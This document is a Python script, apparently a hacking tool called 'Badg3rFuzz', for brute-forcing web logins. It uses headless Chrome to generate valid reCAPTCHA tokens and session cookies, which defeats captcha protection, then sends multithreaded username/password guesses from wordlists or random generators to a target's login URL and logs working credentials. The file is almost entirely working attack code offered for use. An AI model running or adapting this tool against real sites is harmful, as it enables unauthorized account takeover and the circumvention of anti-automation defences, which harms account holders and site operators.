import argparse
import threading
from queue import Queue
import requests
import time
from datetime import datetime
import random
import string
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

#Variables globales para colores

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
GRAY = '\033[90m'

# Banner y funciones de impresión
def print_banner():
    # Códigos de color ANSI
    
    name="Badg3rFuzz"
    now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    
    banner = f"""
{CYAN}╔══════════════════════════════════════════════════════════════════════════════╗{RESET}
{CYAN}║{RESET}                                                                              {CYAN}║{RESET}
{CYAN}║{RESET}        {RED}{BOLD}██████╗  █████╗ ██████╗  ██████╗ ██████╗ ██████╗{RESET}        {CYAN}║{RESET}
{CYAN}║{RESET}        {RED}{BOLD}██╔══██╗██╔══██╗██╔══██╗██╔════╝ ╚════██╗██╔══██╗{RESET}       {CYAN}║{RESET}
{CYAN}║{RESET}        {RED}{BOLD}██████╔╝███████║██║  ██║██║  ███╗ █████╔╝██████╔╝{RESET}       {CYAN}║{RESET}
{CYAN}║{RESET}        {RED}{BOLD}██╔══██╗██╔══██║██║  ██║██║   ██║ ╚═══██╗██╔══██╗{RESET}       {CYAN}║{RESET}
{CYAN}║{RESET}        {RED}{BOLD}██████╔╝██║  ██║██████╔╝╚██████╔╝██████╔╝██║  ██║{RESET}       {CYAN}║{RESET}
{CYAN}║{RESET}        {RED}{BOLD}╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝{RESET}        {CYAN}║{RESET}
{CYAN}║{RESET}                                                                              {CYAN}║{RESET}
{CYAN}║{RESET}   {YELLOW}{BOLD}░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░{RESET}       {CYAN}║{RESET}
{CYAN}║{RESET}   {YELLOW}{BOLD}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░{RESET}      {CYAN}║{RESET}
{CYAN}║{RESET}   {YELLOW}{BOLD}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░{RESET}      {CYAN}║{RESET}
{CYAN}║{RESET}   {YELLOW}{BOLD}░▒▓███████▓▒░ ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓██▓▒░{RESET}       {CYAN}║{RESET}
{CYAN}║{RESET}   {YELLOW}{BOLD}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░{RESET}          {CYAN}║{RESET}
{CYAN}║{RESET}   {YELLOW}{BOLD}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░{RESET}      {CYAN}║{RESET}
{CYAN}║{RESET}   {YELLOW}{BOLD}░▒▓███████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░{RESET}       {CYAN}║{RESET}
{CYAN}║{RESET}                                                                              {CYAN}║{RESET}
{CYAN}║{RESET}        {GREEN}{BOLD}███████╗██╗   ██╗███████╗███████╗███████╗██████╗{RESET}         {CYAN}║{RESET}
{CYAN}║{RESET}        {GREEN}{BOLD}██╔════╝██║   ██║╚══███╔╝╚══███╔╝██╔════╝██╔══██╗{RESET}        {CYAN}║{RESET}
{CYAN}║{RESET}        {GREEN}{BOLD}█████╗  ██║   ██║  ███╔╝   ███╔╝ █████╗  ██████╔╝{RESET}        {CYAN}║{RESET}
{CYAN}║{RESET}        {GREEN}{BOLD}██╔══╝  ██║   ██║ ███╔╝   ███╔╝  ██╔══╝  ██╔══██╗{RESET}        {CYAN}║{RESET}
{CYAN}║{RESET}        {GREEN}{BOLD}██║     ╚██████╔╝███████╗███████╗███████╗██║  ██║{RESET}        {CYAN}║{RESET}
{CYAN}║{RESET}        {GREEN}{BOLD}╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝{RESET}        {CYAN}║{RESET}
{CYAN}║{RESET}                                                                              {CYAN}║{RESET}
{CYAN}║{RESET}  {MAGENTA}╔═══════════════════════════════════════════════════════════════════════╗{RESET}  {CYAN}║{RESET}
{CYAN}║{RESET}  {MAGENTA}║{RESET}                      {WHITE}{BOLD}🦡 {name} 🦡{RESET}                      {MAGENTA}║{RESET}  {CYAN}║{RESET}
{CYAN}║{RESET}  {MAGENTA}║{RESET}                          {BLUE}Inicio: {now}{RESET}                        {MAGENTA}║{RESET}  {CYAN}║{RESET}
{CYAN}║{RESET}  {MAGENTA}╚═══════════════════════════════════════════════════════════════════════╝{RESET}  {CYAN}║{RESET}
{CYAN}║{RESET}                                                                              {CYAN}║{RESET}
{CYAN}║{RESET}    {GREEN}[>]{RESET} {WHITE}Initializing Badg3rFuzz modules...{RESET}                                   {CYAN}║{RESET}
{CYAN}║{RESET}    {GREEN}[>]{RESET} {WHITE}Loading fuzzing payloads and brute force wordlists...{RESET}                {CYAN}║{RESET}
{CYAN}║{RESET}    {GREEN}[>]{RESET} {WHITE}Ready to fuzz and bruteforce your targets!{RESET} {YELLOW}🦡💥{RESET}                         {CYAN}║{RESET}
{CYAN}║{RESET}                                                                              {CYAN}║{RESET}
{CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

def print_footer(start_time):
    end_time = datetime.now()
    dur = end_time - start_time
    print(f"\n⌛ Finalizado: {end_time.strftime('%d-%m-%Y %H:%M:%S')} (duración {dur})\n")

# Globales y flags
combo_queue = Queue()
success_flag = threading.Event()

def generar_token_y_cookie(site_key, captcha_action, login_url):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")

    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.get(login_url)

    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "g-recaptcha"))
        )
    except:
        pass

    token = driver.execute_script(f"""
        return new Promise(resolve => {{
            grecaptcha.ready(function() {{
                grecaptcha.execute("{site_key}", {{action: "{captcha_action}"}}).then(function(token) {{
                    resolve(token);
                }});
            }});
        }});
    """)

    cookies = {cookie["name"]: cookie["value"] for cookie in driver.get_cookies()}
    driver.quit()
    #cookies = {"ASP.NET_SessionId": session_cookie["value"]} if session_cookie else {}
    return token, cookies

def cargar_diccionario(filepath):
    if not filepath or not os.path.exists(filepath):
        return []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def generar_fuzzers(tipo="digits", min_len=5, max_len=10, cantidad=100):
    chars = ''
    if tipo == "digits":
        chars = string.digits
    elif tipo == "digits+":
        chars = "123456789"
    elif tipo == "letters":
        chars = string.ascii_letters
    elif tipo == "mix":
        chars = string.ascii_letters + string.digits
    elif tipo == "strong":
        chars = string.ascii_letters + string.digits + string.punctuation
    else:
        chars = string.digits

    fuzz = set()
    while len(fuzz) < cantidad:
        length = random.randint(min_len, max_len)
        fuzz.add(''.join(random.choices(chars, k=length)))
    return list(fuzz)

def check_success(response, error_indicator):
    if error_indicator is None:
        return False, response.text
    return response.text != error_indicator, error_indicator

def login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url=None):
    token, cookies = generar_token_y_cookie(site_key, captcha_action, login_url)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0",
        "Origin": origin_url if origin_url else login_url.split("/Home")[0],
        "Referer": login_url,
        "Accept": "*/*"
    }

    data = {
        "User": username,
        "Pass": password,
        "tokenCaptcha": token
    }

    with requests.Session() as s:
        s.cookies.update(cookies)
        response = s.post(post_url, headers=headers, data=data)
    return response

def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_success, error_indicator, log_filename):
    while not combo_queue.empty() and not success_flag.is_set():
        username, password = combo_queue.get()
        try:
            response = login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url)
            print(f"[+] Login:password attempt : {username}:{password}")
            print(f"[+] Server Response : {response}")
            success, error_indicator = check_success(response, error_indicator)
            if success:
                print(f"[+] ¡Login válido encontrado! {username}:{password}")
                with open(log_filename, "a", encoding="utf-8") as f:
                    f.write(f"SUCCESS: {username}:{password}\n")
                success_flag.set()
                if stop_on_success:
                    combo_queue.queue.clear()
            else:
                with open(log_filename, "a", encoding="utf-8") as f:
                    f.write(f"FAIL: {username}:{password}\n")
        except Exception as e:
            print(f"[!] Error con {username}:{password}: {e}")
        finally:
            combo_queue.task_done()

def parse_user_fuzzer(fuzzer_str):
    # formato tipo:min_len:max_len:cantidad
    # ejemplo digits:6:6:100
    try:
        tipo, min_len, max_len, cantidad = fuzzer_str.split(":")
        return tipo, int(min_len), int(max_len), int(cantidad)
    except Exception as e:
        raise ValueError(f"Formato incorrecto para --user-fuzz: {fuzzer_str}. Debe ser tipo:min_len:max_len:cantidad") from e

def preparar_combos(username_file, password_file, user_fuzzer):
    if username_file and os.path.exists(username_file):
        usernames = cargar_diccionario(username_file)
    else:
        # genera fuzz para usuarios
        if user_fuzzer:
            tipo, min_len, max_len, cantidad = parse_user_fuzzer(user_fuzzer)
            usernames = generar_fuzzers(tipo, min_len, max_len, cantidad)
        else:
            usernames = generar_fuzzers("digits", 5, 12, 20)

    if password_file and os.path.exists(password_file):
        passwords = cargar_diccionario(password_file)
    else:
        passwords = generar_fuzzers("strong", 8, 16, 20)

    for u in usernames:
        for p in passwords:
            combo_queue.put((u, p))

def main():
    parser = argparse.ArgumentParser(description="Badg3rScan - Fuzzer/fuerza bruta con recaptcha")
    parser.add_argument("--site-key", required=True, help="Site key del reCaptcha")
    parser.add_argument("--captcha-action", required=True, help="Action del reCaptcha")
    parser.add_argument("--login-url", required=True, help="URL donde se carga el captcha (frontend)")
    parser.add_argument("--post-url", required=True, help="URL para POST login")
    parser.add_argument("--pass-file", help="Archivo con passwords uno por línea")
    parser.add_argument("--user-file", help="Archivo con usuarios uno por línea")
    parser.add_argument("--user-fuzz", help="Fuzzer para usuarios tipo:min_len:max_len:cantidad (ejemplo digits:6:6:100)")
    parser.add_argument("--threads", type=int, default=5, help="Cantidad de hilos (default 5)")
    parser.add_argument("--stop-on-success", action="store_true", help="Detener al primer login válido")
    parser.add_argument("--origin-url", help="URL para la cabecera Origin (opcional)")
    parser.add_argument("--no-banner", help="Desactiva el banner genial de badg3rscan", default=False)

    args = parser.parse_args()
    if args.no_banner == False:
        print_banner()
    else:
        start_time = datetime.now()
        print("{WHITE}{BOLD}🦡 {name} 🦡{RESET}")
        print("{BLUE}Inicio: {now}{RESET}    ")


    preparar_combos(args.user_file, args.pass_file, args.user_fuzz)
    print(f"[*] {combo_queue.qsize()} combinaciones preparadas.")
    print(f"[*] Iniciando {args.threads} hilos...")

    error_indicator = None
    log_filename = f"fuzzlog-{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.log"

    start_time = datetime.now()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(
            args.site_key,
            args.captcha_action,
            args.login_url,
            args.post_url,
            args.origin_url,
            args.stop_on_success,
            error_indicator,
            log_filename
        ), daemon=True)
        t.start()
        threads.append(t)

    combo_queue.join()
    for t in threads:
        t.join()

    print_footer(start_time)

if __name__ == "__main__":
    main()
